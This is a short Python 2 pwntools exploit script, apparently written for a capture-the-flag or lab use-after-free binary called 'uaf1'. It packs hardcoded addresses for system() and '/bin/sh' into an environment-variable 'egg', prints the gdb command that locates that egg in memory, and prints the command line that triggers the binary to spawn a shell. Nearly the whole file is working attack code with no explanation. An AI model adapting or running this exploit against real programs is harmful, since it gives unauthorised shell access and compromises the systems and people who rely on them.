#!/usr/bin/env python

from pwn import *
import os, sys

SYSTEM = p64(0x7ffff7a53380)
BINSH  = p64(0x7ffff7b9a58b)
BIN = './uaf1'

p = (SYSTEM * 2 + BINSH * 2)# * 1024
#newEnv = os.environ.copy()
#newEnv['EGG'] = payload

#args = [BIN, [BIN], newEnv]
#os.execve(*args)
payload = '\\x' + '\\x'.join("{:02x}".format( ord(c) ) for c in p)

print "#1 step - make an egg"
print 'export EGG=`perl -e \'print "{0}"x1024\'`'.format(payload)
print "#2 step - find egg address using gdb"
print 'gdb -q {0} -ex "start" -ex "searchmem EGG" --batch'.format(BIN)
print "#3 exploiting"
print "{0} `perl -e 'print \"A\"x24 . \"____\"'`".format(BIN)
